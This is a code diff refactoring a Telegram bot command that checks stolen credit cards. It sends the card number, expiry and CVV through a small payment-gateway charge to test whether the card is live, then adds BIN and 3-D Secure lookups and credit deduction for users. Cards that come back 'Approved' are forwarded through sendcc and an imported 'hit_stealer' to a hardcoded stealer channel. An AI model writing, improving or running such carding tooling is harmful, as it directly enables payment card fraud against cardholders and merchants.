@@ -10,7 +10,6 @@ from .response import *
 from .gate import *
 from BOT.tools.hit_stealer import send_hit_if_approved
 
-# Replace with your actual channel ID
 STEALER_CHANNEL_ID = -1002549777556
 
 async def send_hit_if_approved(client: Client, text: str):
@@ -24,15 +23,14 @@ async def stripe_auth_cmd(Client, message):
     try:
         user_id = str(message.from_user.id)
         checkall = await check_all_thing(Client, message)
-
         gateway = "Br Charge 5$✅"
 
-        if checkall[0] == False:
+        if not checkall[0]:
             return
 
         role = checkall[1]
         getcc = await getmessage(message)
-        if getcc == False:
+        if not getcc:
             resp = f"""<b>
 Gate Name: {gateway} ♻️
 CMD: /br
@@ -43,20 +41,21 @@ Usage: /br cc|mes|ano|cvv</b>"""
             await message.reply_text(resp, message.id)
             return
 
-        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
+        cc, mes, ano, cvv = getcc
         fullcc = f"{cc}|{mes}|{ano}|{cvv}"
 
+        # Animation - Step 1
         firstresp = f"""
 ↯ Checking.
 
 - 𝐂𝐚𝐫𝐝 - <code>{fullcc}</code> 
 - 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 -  <i>{gateway}</i>
 - 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 - ■□□□
-</b>
 """
         await asyncio.sleep(0.5)
         firstchk = await message.reply_text(firstresp, message.id)
 
+        # Animation - Step 2
         secondresp = f"""
 ↯ Checking..
 
@@ -67,17 +66,18 @@ Usage: /br cc|mes|ano|cvv</b>"""
         await asyncio.sleep(0.5)
         secondchk = await Client.edit_message_text(message.chat.id, firstchk.id, secondresp)
 
+        # Start charge
         start = time.perf_counter()
         session = httpx.AsyncClient(timeout=30, follow_redirects=True)
         sks = await getallsk()
         result = await create_cvv_charge(fullcc, session)
         getbin = await get_bin_details(cc)
         getresp = await get_charge_resp(result, user_id, fullcc)
-        
-        # Use the response directly from get_charge_resp
-        status = getresp["status"]  # This will be "Approved" or "Declined"
+
+        status = getresp["status"]
         response = getresp["response"]
 
+        # Animation - Step 3
         thirdresp = f"""
 ↯ Checking...
 
@@ -88,46 +88,27 @@ Usage: /br cc|mes|ano|cvv</b>"""
         await asyncio.sleep(0.5)
         thirdcheck = await Client.edit_message_text(message.chat.id, secondchk.id, thirdresp)
 
-        brand = getbin[0]
-        type = getbin[1]
-        level = getbin[2]
-        bank = getbin[3]
-        country = getbin[4]
-        flag = getbin[5]
-        currency = getbin[6]
+        brand, type_, level, bank, country, flag, currency = getbin
 
-        # Check vbvbin.txt file for VBV status
-        vbv_status = "Not Found"  # Default value if not found
+        # VBV Lookup
+        vbv_status = "Not Found"
+        vbv_response = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
+        vbvv_status = "Lookup Card Error"
+        bin_code = cc[:6]
+
         with open("FILES/vbvbin.txt", "r", encoding="utf-8") as file:
             vbv_data = file.readlines()
 
-        bin_found = False
         for line in vbv_data:
-            if line.startswith(cc[:6]):
-                bin_found = True
+            if line.startswith(bin_code):
                 vbv_response = line.strip().split('|')[1]
-                if "3D TRUE ❌" in vbv_response:
-                    vbv_status = "3D TRUE ❌"
-                elif "3D PASSED ✅" in vbv_response:
-                    vbv_status = "3D PASSED ✅"
+                vbv_status = "3D TRUE ❌" if "3D TRUE ❌" in vbv_response else "3D PASSED ✅"
+                vbvv_status = vbv_status
                 break
 
-        if not bin_found:
-            vbv_response= "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
-            vbvv_status= "Lookup Card Error"
-
-        # Always indicate proxy is live
-        # Always indicate proxy is live
         proxy_status = "Live ✨"
-        bin_code = cc[:6]  # Define bin_code
- if not bin_found:
-    vbv_response = "𝗥𝗲𝗷𝗲𝗰𝘁𝗲𝗱 ❌"
-    vbvv_status = "Lookup Card Error"
 
-# PROXY INFO
-proxy_status = "Live ✨"
-bin_code = cc[:6]
-
+        # Final response
         finalresp = f"""
 {status}
 ━━━━━━━━━━━━━━━
@@ -136,14 +117,14 @@ bin_code = cc[:6]
 [ﾒ] Response ➺ ⤿ {response} ⤾
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 [ﾒ] Bin ➺ {bin_code}
-[ﾒ] Info ➺ {brand} - {type} - {level}
+[ﾒ] Info ➺ {brand} - {type_} - {level}
 [ﾒ] Bank ➺ {bank}
 [ﾒ] Country ➺ {country} - {flag} - {currency}
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 [仝] VBV ➺ {vbv_status}
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
-[ﾒ] Checked By ➺ <a href='tg://user?id={message.from_user.id}'> {message.from_user.first_name}</a> [ {role} ]
-[ﾒ] Dev ➺ ⏤‌‌‌‌ <a href="tg://user?id=7941175119">ᶻⒺ��</a>
+[ﾒ] Checked By ➺ <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a> [ {role} ]
+[ﾒ] Dev ➺ ⏤‌‌‌‌ <a href="tg://user?id=7941175119">ᶻ𝗘𝗥𝗢</a>
 ━━━━━━━━━━━━━━━
 [ﾒ] T/t ➺ [{time.perf_counter() - start:0.2f} seconds] | P/x ➺ [{proxy_status}]
 """
@@ -151,8 +132,10 @@ bin_code = cc[:6]
         await Client.edit_message_text(message.chat.id, thirdcheck.id, finalresp)
         await setantispamtime(user_id)
         await deductcredit(user_id)
+
         if status == "Approved ✅":
             await sendcc(finalresp, session)
+
         await session.aclose()
 
     except Exception as e:
